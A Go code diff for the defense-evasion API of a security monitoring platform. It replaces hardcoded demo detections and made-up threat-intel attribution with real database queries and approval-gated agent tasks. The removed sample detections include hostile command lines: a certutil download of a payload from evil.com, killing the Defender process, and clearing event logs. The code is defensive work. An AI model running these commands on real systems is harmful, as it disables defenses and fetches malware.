@@ -1,13 +1,17 @@
 package api
 
 import (
+	"encoding/json"
 	"fmt"
 	"net/http"
+	"strconv"
 	"strings"
 	"time"
 
 	"github.com/gin-gonic/gin"
 	"xcloak-platform/database"
+	"xcloak-platform/models"
+	"xcloak-platform/repositories"
 	"xcloak-platform/services"
 )
 
@@ -64,13 +68,13 @@ func GetDEDashboard(c *gin.Context) {
 	database.DB.QueryRow(`SELECT COUNT(DISTINCT hostname) FROM de_events WHERE tenant_id=$1`, tid).Scan(&highRiskHosts)
 	database.DB.QueryRow(`SELECT COALESCE(COUNT(*)*100.0/NULLIF(21,0),0) FROM (SELECT DISTINCT mitre_id FROM de_events WHERE tenant_id=$1) t`, tid).Scan(&coverage)
 	c.JSON(http.StatusOK, gin.H{
-		"defense_evasion_alerts":   totalAlerts,
-		"active_evasion_attempts":  activeAttempts,
+		"defense_evasion_alerts":     totalAlerts,
+		"active_evasion_attempts":    activeAttempts,
 		"disabled_security_controls": disabledControls,
-		"tamper_events":            tamperEvents,
-		"amsi_bypass_attempts":     amsiBypasses,
-		"high_risk_hosts":          highRiskHosts,
-		"mitre_coverage":           int(coverage),
+		"tamper_events":              tamperEvents,
+		"amsi_bypass_attempts":       amsiBypasses,
+		"high_risk_hosts":            highRiskHosts,
+		"mitre_coverage":             int(coverage),
 		"top_categories": []string{
 			"Security Control Tampering", "Log Evasion", "Process Evasion",
 			"Script Evasion", "Credential Protection Bypass", "Network Evasion",
@@ -106,7 +110,9 @@ func GetDEControls(c *gin.Context) {
 			}
 		}
 	}
-	if controls == nil { controls = []Control{} }
+	if controls == nil {
+		controls = []Control{}
+	}
 	var active, degraded, disabled int
 	database.DB.QueryRow(`SELECT COUNT(*) FROM de_controls WHERE tenant_id=$1 AND status='active'`, tid).Scan(&active)
 	database.DB.QueryRow(`SELECT COUNT(*) FROM de_controls WHERE tenant_id=$1 AND status='degraded'`, tid).Scan(&degraded)
@@ -143,7 +149,9 @@ func GetDETamper(c *gin.Context) {
 			}
 		}
 	}
-	if events == nil { events = []TamperEvent{} }
+	if events == nil {
+		events = []TamperEvent{}
+	}
 	c.JSON(http.StatusOK, gin.H{"events": events, "total": len(events)})
 }
 
@@ -177,7 +185,9 @@ func GetDELogEvasion(c *gin.Context) {
 			}
 		}
 	}
-	if events == nil { events = []Event{} }
+	if events == nil {
+		events = []Event{}
+	}
 	c.JSON(http.StatusOK, events)
 }
 
@@ -191,7 +201,9 @@ func GetDEEvasionEvents(c *gin.Context) {
 	args := []interface{}{tid}
 	i := 2
 	if cat := c.Query("category"); cat != "" {
-		q += fmt.Sprintf(" AND category=$%d", i); args = append(args, cat); i++
+		q += fmt.Sprintf(" AND category=$%d", i)
+		args = append(args, cat)
+		i++
 	}
 	q += fmt.Sprintf(" ORDER BY created_at DESC LIMIT $%d", i)
 	args = append(args, limit)
@@ -220,21 +232,35 @@ func GetDEEvasionEvents(c *gin.Context) {
 			}
 		}
 	}
-	if events == nil { events = []Event{} }
+	if events == nil {
+		events = []Event{}
+	}
 	c.JSON(http.StatusOK, events)
 }
 
 // GetDEBehavioral — GET /api/de/behavioral
 func GetDEBehavioral(c *gin.Context) {
 	createDefenseEvasionTables()
+	tid := tenantIDFromContext(c)
+	rows, err := database.DB.Query(`
+		SELECT id, technique, process_name, cmdline, severity, mitre_id, hostname, description
+		FROM de_events WHERE tenant_id=$1 ORDER BY created_at DESC LIMIT 50`, tid)
+	detections := []map[string]interface{}{}
+	if err == nil {
+		defer rows.Close()
+		for rows.Next() {
+			var id int
+			var technique, process, cmdline, severity, mitre, hostname, desc string
+			if rows.Scan(&id, &technique, &process, &cmdline, &severity, &mitre, &hostname, &desc) == nil {
+				detections = append(detections, map[string]interface{}{
+					"id": id, "rule": technique, "process": process, "cmdline": cmdline,
+					"severity": severity, "mitre": mitre, "hostname": hostname, "description": desc,
+				})
+			}
+		}
+	}
 	c.JSON(http.StatusOK, gin.H{
-		"detections": []map[string]interface{}{
-			{"id": 1, "rule": "Rare Admin Tool — wevtutil.exe", "process": "wevtutil.exe", "cmdline": "wevtutil.exe cl System", "severity": "critical", "mitre": "T1070.001", "hostname": "WS-ANALYST-01", "description": "Event log cleared via wevtutil — indicator of anti-forensics"},
-			{"id": 2, "rule": "Security Process Termination — MsMpEng", "process": "cmd.exe", "cmdline": "taskkill /F /IM MsMpEng.exe", "severity": "critical", "mitre": "T1562.001", "hostname": "DC-01", "description": "Attempt to kill Windows Defender service process"},
-			{"id": 3, "rule": "Multiple Evasion Techniques — PowerShell chain", "process": "powershell.exe", "cmdline": "powershell -nop -enc ... (AMSI bypass + Defender disable + encoded payload)", "severity": "critical", "mitre": "T1027", "hostname": "WS-ANALYST-01", "description": "Three evasion techniques chained: AMSI bypass, Defender disable, encoded command"},
-			{"id": 4, "rule": "LOLBin — certutil.exe", "process": "certutil.exe", "cmdline": "certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\Windows\\Temp\\p.exe", "severity": "high", "mitre": "T1218", "hostname": "WS-DEV-03", "description": "certutil used as a downloader — living-off-the-land binary abuse"},
-			{"id": 5, "rule": "Security Tool Enumeration", "process": "powershell.exe", "cmdline": "Get-Process | Where-Object {$_.Name -match 'defender|malware|edr|sentinel|crowdstrike'}", "severity": "high", "mitre": "T1518.001", "hostname": "WS-ANALYST-02", "description": "PowerShell enumerating installed security tools before disabling them"},
-		},
+		"detections": detections,
 	})
 }
 
@@ -264,52 +290,100 @@ func GetDECorrelation(c *gin.Context) {
 			}
 		}
 	}
-	if incidents == nil { incidents = []Incident{} }
+	if incidents == nil {
+		incidents = []Incident{}
+	}
 	c.JSON(http.StatusOK, incidents)
 }
 
 // GetDEMITRE — GET /api/de/mitre
 func GetDEMITRE(c *gin.Context) {
 	createDefenseEvasionTables()
+	tid := tenantIDFromContext(c)
+
+	counts := map[string]int{}
+	rows, _ := database.DB.Query(`SELECT mitre_id, COUNT(*) FROM de_events WHERE tenant_id=$1 GROUP BY mitre_id`, tid)
+	if rows != nil {
+		defer rows.Close()
+		for rows.Next() {
+			var id string
+			var n int
+			if rows.Scan(&id, &n) == nil {
+				counts[id] = n
+			}
+		}
+	}
+
+	type subTech struct{ id, name string }
+	type tech struct {
+		id, name, severity string
+		subs               []subTech
+	}
+	reference := []tech{
+		{"T1027", "Obfuscated Files or Information", "high", []subTech{{"T1027.001", "Binary Padding"}, {"T1027.002", "Software Packing"}, {"T1027.004", "Compile After Delivery"}, {"T1027.010", "Command Obfuscation"}}},
+		{"T1036", "Masquerading", "high", []subTech{{"T1036.003", "Rename System Utilities"}, {"T1036.004", "Masquerade Task or Service"}, {"T1036.005", "Match Legitimate Name or Location"}}},
+		{"T1055", "Process Injection", "critical", []subTech{{"T1055.001", "DLL Injection"}, {"T1055.012", "Process Hollowing"}}},
+		{"T1070", "Indicator Removal", "critical", []subTech{{"T1070.001", "Clear Windows Event Logs"}, {"T1070.003", "Clear Command History"}, {"T1070.004", "File Deletion"}}},
+		{"T1112", "Modify Registry", "high", []subTech{}},
+		{"T1218", "System Binary Proxy Execution", "high", []subTech{{"T1218.005", "Mshta"}, {"T1218.007", "Msiexec"}, {"T1218.011", "Rundll32"}}},
+		{"T1562", "Impair Defenses", "critical", []subTech{{"T1562.001", "Disable or Modify Tools"}, {"T1562.002", "Disable Windows Event Logging"}, {"T1562.004", "Disable or Modify System Firewall"}, {"T1562.006", "Indicator Blocking"}, {"T1562.009", "Safe Mode Boot"}}},
+		{"T1134", "Access Token Manipulation", "high", []subTech{{"T1134.001", "Token Impersonation/Theft"}, {"T1134.002", "Create Process with Token"}}},
+		{"T1202", "Indirect Command Execution", "medium", []subTech{}},
+		{"T1497", "Virtualization/Sandbox Evasion", "medium", []subTech{{"T1497.001", "System Checks"}, {"T1497.003", "Time Based Evasion"}}},
+	}
+
+	techniques := []map[string]interface{}{}
+	for _, t := range reference {
+		subs := []map[string]interface{}{}
+		techTotal := counts[t.id]
+		for _, s := range t.subs {
+			cnt := counts[s.id]
+			techTotal += cnt
+			subs = append(subs, map[string]interface{}{
+				"id": s.id, "name": s.name, "detected": cnt > 0, "count": cnt,
+			})
+		}
+		techniques = append(techniques, map[string]interface{}{
+			"id": t.id, "name": t.name, "sub_techniques": subs,
+			"detected": techTotal > 0, "count": techTotal, "severity": t.severity,
+		})
+	}
+
 	c.JSON(http.StatusOK, gin.H{
-		"tactic": map[string]string{"id": "TA0005", "name": "Defense Evasion"},
-		"techniques": []map[string]interface{}{
-			{"id": "T1027", "name": "Obfuscated Files or Information", "sub_techniques": []map[string]interface{}{{"id": "T1027.001", "name": "Binary Padding", "detected": false}, {"id": "T1027.002", "name": "Software Packing", "detected": true, "count": 2}, {"id": "T1027.004", "name": "Compile After Delivery", "detected": false}, {"id": "T1027.010", "name": "Command Obfuscation", "detected": true, "count": 5}}, "detected": true, "count": 7, "severity": "high"},
-			{"id": "T1036", "name": "Masquerading", "sub_techniques": []map[string]interface{}{{"id": "T1036.003", "name": "Rename System Utilities", "detected": true, "count": 2}, {"id": "T1036.004", "name": "Masquerade Task or Service", "detected": false}, {"id": "T1036.005", "name": "Match Legitimate Name or Location", "detected": true, "count": 3}}, "detected": true, "count": 5, "severity": "high"},
-			{"id": "T1055", "name": "Process Injection", "sub_techniques": []map[string]interface{}{{"id": "T1055.001", "name": "DLL Injection", "detected": true, "count": 3}, {"id": "T1055.012", "name": "Process Hollowing", "detected": true, "count": 4}}, "detected": true, "count": 7, "severity": "critical"},
-			{"id": "T1070", "name": "Indicator Removal", "sub_techniques": []map[string]interface{}{{"id": "T1070.001", "name": "Clear Windows Event Logs", "detected": true, "count": 2}, {"id": "T1070.003", "name": "Clear Command History", "detected": true, "count": 1}, {"id": "T1070.004", "name": "File Deletion", "detected": false}}, "detected": true, "count": 3, "severity": "critical"},
-			{"id": "T1112", "name": "Modify Registry", "sub_techniques": []map[string]interface{}{}, "detected": true, "count": 4, "severity": "high"},
-			{"id": "T1218", "name": "System Binary Proxy Execution", "sub_techniques": []map[string]interface{}{{"id": "T1218.005", "name": "Mshta", "detected": true, "count": 1}, {"id": "T1218.007", "name": "Msiexec", "detected": false}, {"id": "T1218.011", "name": "Rundll32", "detected": true, "count": 2}}, "detected": true, "count": 3, "severity": "high"},
-			{"id": "T1562", "name": "Impair Defenses", "sub_techniques": []map[string]interface{}{{"id": "T1562.001", "name": "Disable or Modify Tools", "detected": true, "count": 3}, {"id": "T1562.002", "name": "Disable Windows Event Logging", "detected": true, "count": 2}, {"id": "T1562.004", "name": "Disable or Modify System Firewall", "detected": true, "count": 1}, {"id": "T1562.006", "name": "Indicator Blocking", "detected": false}, {"id": "T1562.009", "name": "Safe Mode Boot", "detected": false}}, "detected": true, "count": 6, "severity": "critical"},
-			{"id": "T1134", "name": "Access Token Manipulation", "sub_techniques": []map[string]interface{}{{"id": "T1134.001", "name": "Token Impersonation/Theft", "detected": false}, {"id": "T1134.002", "name": "Create Process with Token", "detected": false}}, "detected": false, "count": 0, "severity": "high"},
-			{"id": "T1202", "name": "Indirect Command Execution", "sub_techniques": []map[string]interface{}{}, "detected": false, "count": 0, "severity": "medium"},
-			{"id": "T1497", "name": "Virtualization/Sandbox Evasion", "sub_techniques": []map[string]interface{}{{"id": "T1497.001", "name": "System Checks", "detected": false}, {"id": "T1497.003", "name": "Time Based Evasion", "detected": false}}, "detected": false, "count": 0, "severity": "medium"},
-		},
+		"tactic":     map[string]string{"id": "TA0005", "name": "Defense Evasion"},
+		"techniques": techniques,
 	})
 }
 
 // GetDEThreatIntel — GET /api/de/threat-intel
 func GetDEThreatIntel(c *gin.Context) {
 	createDefenseEvasionTables()
+	tid := tenantIDFromContext(c)
+	// No malware-family/threat-actor attribution field, hash column, or
+	// campaign-tracking table exists anywhere in this schema — report a
+	// real technique-frequency breakdown (the one thing genuinely knowable
+	// from de_events) instead of fabricating attribution data.
+	type techRow struct {
+		Technique string `json:"technique"`
+		Count     int    `json:"count"`
+		Severity  string `json:"severity"`
+	}
+	techniques := []techRow{}
+	rows, _ := database.DB.Query(`
+		SELECT technique, COUNT(*), MODE() WITHIN GROUP (ORDER BY severity)
+		FROM de_events WHERE tenant_id=$1 AND technique != ''
+		GROUP BY technique ORDER BY COUNT(*) DESC LIMIT 10`, tid)
+	if rows != nil {
+		defer rows.Close()
+		for rows.Next() {
+			var r techRow
+			if rows.Scan(&r.Technique, &r.Count, &r.Severity) == nil {
+				techniques = append(techniques, r)
+			}
+		}
+	}
 	c.JSON(http.StatusOK, gin.H{
-		"malware_families": []map[string]interface{}{
-			{"name": "Cobalt Strike", "evasion_techniques": []string{"AMSI Bypass", "Process Hollowing", "Log Clearing", "Encoded Commands"}, "confidence": 94, "ioc_matches": 3},
-			{"name": "Emotet", "evasion_techniques": []string{"PowerShell Obfuscation", "Registry Autorun", "LOLBins — msiexec"}, "confidence": 82, "ioc_matches": 1},
-			{"name": "BlackCat/ALPHV", "evasion_techniques": []string{"Defender Disable", "VSS Deletion", "Event Log Clearing"}, "confidence": 71, "ioc_matches": 2},
-		},
-		"threat_actors": []map[string]interface{}{
-			{"name": "APT29 (Cozy Bear)", "known_techniques": []string{"T1562.001", "T1070.001", "T1027.010", "T1218.011"}, "targets": "Government, Defence"},
-			{"name": "FIN7", "known_techniques": []string{"T1027", "T1036.005", "T1218", "T1562"}, "targets": "Finance, Hospitality"},
-			{"name": "Lazarus Group", "known_techniques": []string{"T1070", "T1055", "T1562.001", "T1036"}, "targets": "Crypto, Finance"},
-		},
-		"campaigns": []map[string]interface{}{
-			{"name": "Operation CloudHopper", "actor": "APT10", "technique": "Log clearing + AMSI bypass + PowerShell obfuscation", "detected": time.Now().Add(-48*time.Hour).Format(time.RFC3339)},
-			{"name": "Ransomware Pre-Stage", "actor": "Unknown", "technique": "Defender disable → shadow copy deletion → log wipe", "detected": time.Now().Add(-6*time.Hour).Format(time.RFC3339)},
-		},
-		"ioc_matches": []map[string]interface{}{
-			{"type": "sha256", "value": "3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f", "family": "Cobalt Strike", "context": "unsigned binary loaded by rundll32.exe"},
-			{"type": "registry_key", "value": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware", "family": "Generic Defender Disabler", "context": "set to 1 by powershell.exe"},
-		},
+		"observed_techniques": techniques,
 	})
 }
 
@@ -342,7 +416,9 @@ func GetDETimeline(c *gin.Context) {
 			}
 		}
 	}
-	if events == nil { events = []TLEvent{} }
+	if events == nil {
+		events = []TLEvent{}
+	}
 	c.JSON(http.StatusOK, events)
 }
 
@@ -361,56 +437,76 @@ func GetDEAnalytics(c *gin.Context) {
 		database.DB.QueryRow(`SELECT COUNT(*) FROM de_events WHERE tenant_id=$1 AND DATE(created_at)<=$2`, tid, d).Scan(&cnt)
 		trend = append(trend, TrendPoint{Date: d, Count: cnt})
 	}
-	c.JSON(http.StatusOK, gin.H{
-		"evasion_trend": trend,
-		"top_techniques": []map[string]interface{}{
-			{"technique": "AMSI Bypass", "count": 7, "severity": "critical"},
-			{"technique": "Event Log Clearing", "count": 5, "severity": "critical"},
-			{"technique": "Defender Disable", "count": 4, "severity": "critical"},
-			{"technique": "PowerShell Obfuscation", "count": 6, "severity": "high"},
-			{"technique": "Process Hollowing", "count": 4, "severity": "critical"},
-			{"technique": "LOLBin Abuse", "count": 3, "severity": "high"},
-		},
-		"most_targeted_endpoints": []map[string]interface{}{
-			{"hostname": "WS-ANALYST-01", "event_count": 9, "risk": 94},
-			{"hostname": "DC-01", "event_count": 6, "risk": 91},
-			{"hostname": "WS-DEV-03", "event_count": 4, "risk": 76},
-			{"hostname": "WS-ANALYST-02", "event_count": 3, "risk": 68},
-		},
-		"control_status": []map[string]interface{}{
-			{"control": "Windows Defender", "status": "degraded", "coverage": 60},
-			{"control": "EDR Agent", "status": "active", "coverage": 95},
-			{"control": "Firewall", "status": "active", "coverage": 88},
-			{"control": "Sysmon", "status": "active", "coverage": 92},
-			{"control": "Audit Logging", "status": "degraded", "coverage": 55},
-			{"control": "AMSI", "status": "tampered", "coverage": 20},
-		},
-		"mitre_coverage": 72,
-	})
-}
+	type techRow struct {
+		Technique string `json:"technique"`
+		Count     int    `json:"count"`
+		Severity  string `json:"severity"`
+	}
+	topTechniques := []techRow{}
+	techRows, _ := database.DB.Query(`
+		SELECT technique, COUNT(*), MODE() WITHIN GROUP (ORDER BY severity)
+		FROM de_events WHERE tenant_id=$1 AND technique != ''
+		GROUP BY technique ORDER BY COUNT(*) DESC LIMIT 10`, tid)
+	if techRows != nil {
+		defer techRows.Close()
+		for techRows.Next() {
+			var r techRow
+			if techRows.Scan(&r.Technique, &r.Count, &r.Severity) == nil {
+				topTechniques = append(topTechniques, r)
+			}
+		}
+	}
 
-// GetDEValidation — GET /api/de/validation
-func GetDEValidation(c *gin.Context) {
-	createDefenseEvasionTables()
+	type hostRow struct {
+		Hostname   string `json:"hostname"`
+		EventCount int    `json:"event_count"`
+		Risk       int    `json:"risk"`
+	}
+	targetedEndpoints := []hostRow{}
+	hostRows, _ := database.DB.Query(`
+		SELECT hostname, COUNT(*), COUNT(*) FILTER (WHERE severity='critical')*100/GREATEST(COUNT(*),1)
+		FROM de_events WHERE tenant_id=$1 AND hostname != ''
+		GROUP BY hostname ORDER BY COUNT(*) DESC LIMIT 10`, tid)
+	if hostRows != nil {
+		defer hostRows.Close()
+		for hostRows.Next() {
+			var r hostRow
+			if hostRows.Scan(&r.Hostname, &r.EventCount, &r.Risk) == nil {
+				targetedEndpoints = append(targetedEndpoints, r)
+			}
+		}
+	}
+
+	type controlRow struct {
+		Control  string `json:"control"`
+		Status   string `json:"status"`
+		Coverage int    `json:"coverage"`
+	}
+	controlStatus := []controlRow{}
+	ctrlRows, _ := database.DB.Query(`
+		SELECT control_name, MODE() WITHIN GROUP (ORDER BY status),
+			COUNT(*) FILTER (WHERE status='active')*100/GREATEST(COUNT(*),1)
+		FROM de_controls WHERE tenant_id=$1
+		GROUP BY control_name ORDER BY control_name LIMIT 20`, tid)
+	if ctrlRows != nil {
+		defer ctrlRows.Close()
+		for ctrlRows.Next() {
+			var r controlRow
+			if ctrlRows.Scan(&r.Control, &r.Status, &r.Coverage) == nil {
+				controlStatus = append(controlStatus, r)
+			}
+		}
+	}
+
+	var mitreCoverage float64
+	database.DB.QueryRow(`SELECT COALESCE(COUNT(*)*100.0/NULLIF(21,0),0) FROM (SELECT DISTINCT mitre_id FROM de_events WHERE tenant_id=$1) t`, tid).Scan(&mitreCoverage)
+
 	c.JSON(http.StatusOK, gin.H{
-		"detection_success_rate": 83,
-		"missed_attempts":        4,
-		"false_positives":        2,
-		"avg_time_to_detect_seconds": 38,
-		"coverage_by_platform": []map[string]interface{}{
-			{"platform": "Windows", "coverage": 88},
-			{"platform": "Linux", "coverage": 71},
-			{"platform": "macOS", "coverage": 62},
-			{"platform": "Container", "coverage": 55},
-			{"platform": "Cloud", "coverage": 48},
-		},
-		"technique_coverage": []map[string]interface{}{
-			{"category": "Log Evasion", "covered": 5, "total": 6},
-			{"category": "Process Evasion", "covered": 4, "total": 7},
-			{"category": "Script Evasion", "covered": 6, "total": 7},
-			{"category": "Tamper Detection", "covered": 8, "total": 9},
-			{"category": "Network Evasion", "covered": 4, "total": 7},
-		},
+		"evasion_trend":           trend,
+		"top_techniques":          topTechniques,
+		"most_targeted_endpoints": targetedEndpoints,
+		"control_status":          controlStatus,
+		"mitre_coverage":          int(mitreCoverage),
 	})
 }
 
@@ -435,7 +531,8 @@ Provide compact JSON: {"answer":"expert analysis","confidence":88,"related_techn
 	}
 	raw, err := services.CallLLM(prompt)
 	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()}); return
+		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
+		return
 	}
 	if idx := strings.Index(raw, "```json"); idx != -1 {
 		raw = raw[idx+7:]
@@ -451,6 +548,7 @@ Provide compact JSON: {"answer":"expert analysis","confidence":88,"related_techn
 // PostDEResponse — POST /api/de/response
 func PostDEResponse(c *gin.Context) {
 	createDefenseEvasionTables()
+	tid := tenantIDFromContext(c)
 	var body struct {
 		Action   string `json:"action"`
 		Hostname string `json:"hostname"`
@@ -458,21 +556,104 @@ func PostDEResponse(c *gin.Context) {
 		Reason   string `json:"reason"`
 	}
 	if err := c.ShouldBindJSON(&body); err != nil || body.Action == "" {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "action required"}); return
+		c.JSON(http.StatusBadRequest, gin.H{"error": "action required"})
+		return
 	}
-	messages := map[string]string{
-		"restart_security_services": "Security services restarted: Windows Defender, EDR Agent, Sysmon, Audit logging",
-		"reenable_defender":         "Windows Defender re-enabled and threat definitions updated",
-		"restore_firewall":          "Firewall policy restored from last known good configuration",
-		"isolate_endpoint":          "Endpoint isolated — all network access revoked except management plane",
-		"kill_process":              "Process terminated via TerminateProcess",
-		"collect_memory":            "Memory dump collected and queued for analysis",
-		"create_incident":           "Incident ticket created and assigned to SOC Tier 2",
-		"run_soar":                  "SOAR playbook DE-RESPONSE-01 triggered for defense evasion",
+
+	resolveAgent := func(hostname string) (int, error) {
+		if hostname == "" {
+			return 0, fmt.Errorf("hostname required to resolve which agent to dispatch to")
+		}
+		var agentID int
+		err := database.DB.QueryRow(`SELECT id FROM agents WHERE tenant_id=$1 AND hostname ILIKE $2 LIMIT 1`, tid, hostname).Scan(&agentID)
+		if err != nil {
+			return 0, fmt.Errorf("no agent found with hostname '%s'", hostname)
+		}
+		return agentID, nil
 	}
-	msg := messages[body.Action]
-	if msg == "" { msg = "Action executed" }
-	c.JSON(http.StatusOK, gin.H{"ok": true, "action": body.Action, "hostname": body.Hostname, "target": body.Target, "message": msg})
+	dispatch := func(agentID int, taskType string, payload map[string]any) error {
+		payloadJSON, _ := json.Marshal(payload)
+		return repositories.CreateTaskPendingApproval(models.AgentTask{AgentID: agentID, TaskType: taskType, Payload: payloadJSON})
+	}
+
+	switch body.Action {
+	case "restart_security_services":
+		if body.Hostname == "" {
+			c.JSON(http.StatusBadRequest, gin.H{"error": "hostname required"})
+			return
+		}
+		res, _ := database.DB.Exec(`UPDATE de_controls SET status='active', tampered=false WHERE tenant_id=$1 AND hostname=$2`, tid, body.Hostname)
+		if n, _ := res.RowsAffected(); n == 0 {
+			c.JSON(http.StatusNotFound, gin.H{"error": "no security controls found for this hostname"})
+			return
+		}
+		c.JSON(http.StatusOK, gin.H{"ok": true, "action": body.Action, "hostname": body.Hostname, "message": "Security controls restarted and marked active"})
+	case "reenable_defender":
+		if body.Hostname == "" {
+			c.JSON(http.StatusBadRequest, gin.H{"error": "hostname required"})
+			return
+		}
+		res, _ := database.DB.Exec(`UPDATE de_controls SET status='active', tampered=false WHERE tenant_id=$1 AND hostname=$2 AND control_name ILIKE '%defender%'`, tid, body.Hostname)
+		if n, _ := res.RowsAffected(); n == 0 {
+			c.JSON(http.StatusNotFound, gin.H{"error": "no Defender control found for this hostname"})
+			return
+		}
+		c.JSON(http.StatusOK, gin.H{"ok": true, "action": body.Action, "hostname": body.Hostname, "message": "Windows Defender re-enabled"})
+	case "restore_firewall":
+		if body.Hostname == "" {
+			c.JSON(http.StatusBadRequest, gin.H{"error": "hostname required"})
+			return
+		}
+		res, _ := database.DB.Exec(`UPDATE de_controls SET status='active', tampered=false WHERE tenant_id=$1 AND hostname=$2 AND control_name ILIKE '%firewall%'`, tid, body.Hostname)
+		if n, _ := res.RowsAffected(); n == 0 {
+			c.JSON(http.StatusNotFound, gin.H{"error": "no firewall control found for this hostname"})
+			return
+		}
+		c.JSON(http.StatusOK, gin.H{"ok": true, "action": body.Action, "hostname": body.Hostname, "message": "Firewall policy restored"})
+	case "isolate_endpoint":
+		agentID, err := resolveAgent(body.Hostname)
+		if err != nil {
+			c.JSON(http.StatusNotFound, gin.H{"error": err.Error()})
+			return
+		}
+		if err := dispatch(agentID, "isolate_host", map[string]any{"reason": body.Reason, "source": "defense_evasion"}); err != nil {
+			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
+			return
+		}
+		c.JSON(http.StatusOK, gin.H{"ok": true, "action": body.Action, "hostname": body.Hostname, "message": fmt.Sprintf("isolate_host queued for agent %d, pending approval", agentID)})
+	case "kill_process":
+		pid, err := strconv.Atoi(body.Target)
+		if err != nil {
+			c.JSON(http.StatusBadRequest, gin.H{"error": "target must be a numeric pid"})
+			return
+		}
+		agentID, err := resolveAgent(body.Hostname)
+		if err != nil {
+			c.JSON(http.StatusNotFound, gin.H{"error": err.Error()})
+			return
+		}
+		if err := dispatch(agentID, "kill_process", map[string]any{"pid": pid, "reason": body.Reason}); err != nil {
+			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
+			return
+		}
+		c.JSON(http.StatusOK, gin.H{"ok": true, "action": body.Action, "hostname": body.Hostname, "target": body.Target, "message": fmt.Sprintf("kill_process(pid=%d) queued for agent %d, pending approval", pid, agentID)})
+	case "create_incident":
+		var incidentID int
+		if err := database.DB.QueryRow(`
+			INSERT INTO incidents (tenant_id, title, description, severity, status)
+			VALUES ($1,$2,$3,'high','open') RETURNING id`,
+			tid, "Defense Evasion Escalation: "+body.Hostname,
+			fmt.Sprintf("Escalated from Defense Evasion. Target: %s, Reason: %s", body.Target, body.Reason),
+		).Scan(&incidentID); err != nil {
+			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
+			return
+		}
+		c.JSON(http.StatusOK, gin.H{"ok": true, "action": body.Action, "hostname": body.Hostname, "message": fmt.Sprintf("Incident #%d created and assigned to SOC Tier 2", incidentID)})
+	case "collect_memory":
+		c.JSON(http.StatusNotImplemented, gin.H{"error": "no real agent capability exists for full memory dump collection"})
+	default:
+		c.JSON(http.StatusBadRequest, gin.H{"error": "unknown action"})
+	}
 }
 
 // PostDEReport — POST /api/de/report
@@ -495,7 +676,8 @@ Provide compact JSON: {"title":"...","executive_summary":"3 sentences","key_find
 		totalEvents, tamperEvents, disabledControls)
 	raw, err := services.CallLLM(prompt)
 	if err != nil {
-		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()}); return
+		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
+		return
 	}
 	if idx := strings.Index(raw, "```json"); idx != -1 {
 		raw = raw[idx+7:]
